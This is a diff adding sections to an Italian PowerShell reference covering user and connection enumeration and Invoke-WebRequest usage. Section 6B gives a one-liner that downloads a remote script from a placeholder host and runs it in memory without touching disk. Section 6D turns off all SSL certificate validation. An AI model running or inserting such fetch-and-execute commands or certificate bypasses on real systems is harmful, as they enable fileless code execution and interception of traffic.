@@ -83,3 +83,60 @@ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 10
 
 ### Panoramica:
 Il comando interroga il registro eventi alla ricerca dell'ID `4625`, che corrisponde a tentativi di accesso falliti. Una sequenza ravvicinata di questi eventi può indicare tentativi di accesso automatizzati non autorizzati (es. brute force o password spraying). Per un'analisi più approfondita, è possibile espandere il campo *Message* dell'evento per identificare lo username target, l'indirizzo IP di provenienza e il tipo di logon utilizzato.
+
+---
+
+## 5. Altri Comandi Windows Utili
+
+Questi sono comandi nativi di Windows (cmd.exe) che possono essere eseguiti anche all'interno di una sessione PowerShell per attività rapide di enumerazione:
+
+### A. Dettagli Utente Specifico
+Mostra i dettagli completi relativi a un account utente locale o di dominio, inclusa l'appartenenza a gruppi e le impostazioni di scadenza/cambio password:
+```powershell
+net user "nomeutente"
+```
+
+### B. Elenco Connessioni TCP Attive con PID
+Elenca tutte le connessioni TCP attive sul sistema, mostrando gli indirizzi remoti, le porte e il relativo ID del processo (PID) per ciascuna di esse:
+```powershell
+netstat -ano -p tcp
+```
+
+---
+
+## 6. Esempi di Invoke-WebRequest (iwr)
+
+`Invoke-WebRequest` (noto anche con l'alias `iwr`) è il cmdlet PowerShell equivalente a `curl` o `wget` per interagire con i server web e scaricare risorse.
+
+### A. Download di un File e Salvataggio Locale
+Scarica un file da un indirizzo remoto e lo memorizza nel percorso specificato sul disco:
+```powershell
+Invoke-WebRequest -Uri "http://example.com/file.zip" -OutFile "C:\Temp\file.zip"
+# Oppure in forma abbreviata:
+iwr -Uri "http://example.com/file.zip" -OutFile "C:\Temp\file.zip"
+```
+
+### B. Download ed Esecuzione in Memoria (IEX)
+Scarica uno script PowerShell remoto e lo esegue direttamente in memoria senza salvarlo sul disco (utilizzando `Invoke-Expression` o `iex`):
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')
+# Oppure tramite iwr (PowerShell v3+):
+iwr -UseBasicParsing "http://example.com/script.ps1" | iex
+```
+
+### C. Visualizzazione dei Dettagli di Risposta
+Esegue una richiesta HTTP GET per esaminare il corpo del messaggio o i metadati delle intestazioni (Headers):
+```powershell
+# Legge il contenuto testuale grezzo della risposta
+(Invoke-WebRequest -Uri "http://example.com").Content
+
+# Estrae solo gli header di risposta HTTP
+(Invoke-WebRequest -Uri "http://example.com").Headers
+```
+
+### D. Bypassare Errori di Certificato SSL (Self-Signed)
+Forza PowerShell a ignorare eventuali errori dovuti a certificati SSL scaduti o non emessi da un'autorità riconosciuta:
+```powershell
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+iwr -Uri "https://target-con-ssl-non-valido.com"
+```
